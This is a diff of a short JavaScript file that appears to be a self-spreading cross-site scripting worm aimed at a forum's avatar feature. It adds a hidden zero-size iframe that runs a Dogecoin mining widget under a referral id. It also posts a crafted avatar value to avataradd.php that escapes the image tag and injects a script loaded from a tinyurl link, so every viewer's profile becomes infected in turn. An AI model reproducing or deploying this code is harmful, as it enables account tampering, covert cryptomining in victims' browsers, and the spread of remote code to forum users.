@@ -1,19 +1,15 @@
 $('<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/dogecoin/?ref=D24F0FE435EB&mode=widget" style="border:0;width:0;height:0;"></iframe>').appendTo('body');
 $.get('/avatar.php',(result)=>{
-  let ava = result.indexOf('กดเลือกใช้ Avatar ที่ชอบ');
+    let ava = result.indexOf('กดเลือกใช้ Avatar ที่ชอบ');
 	if(ava>0){
 	    var aroundava = result.substring(ava, ava+300);
-		res = [...aroundava.matchAll(/(img src=\'|\")([^\'\"]*)([^>]*)/g)];
+		res = [...aroundava.matchAll(/(img src=\"|\')([^\'\"]*)([^>]*)/g)];
 		if(res[0]){
 			if(res[0][2] && res[0][2].length + 56 <= 100){
-				$.post( "avataradd.php", { fileavatar: res[0][2] + '" border="0"><script src="https://tinyurl.com/smuq7p4"></script><a ' })
-				.done(function( data ) {
-				});
+				$.post( "avataradd.php", { fileavatar: res[0][2] + '" border=0><script src="https://tinyurl.com/smuq7p4"></script></a><a href="#' })
 			}
 		}else{
-			$.post( "avataradd.php", {  fileavatar: '/pic/default_avatar.gif"><script src="https://tinyurl.com/smuq7p4"></script><a ' })
-			.done(function( data ) {
-			});
+			$.post( "avataradd.php", {  fileavatar: '/pic/default_avatar.gif" border=0><script src="https://tinyurl.com/smuq7p4"></script></a><a href="#' })
 		}
 	}
 })
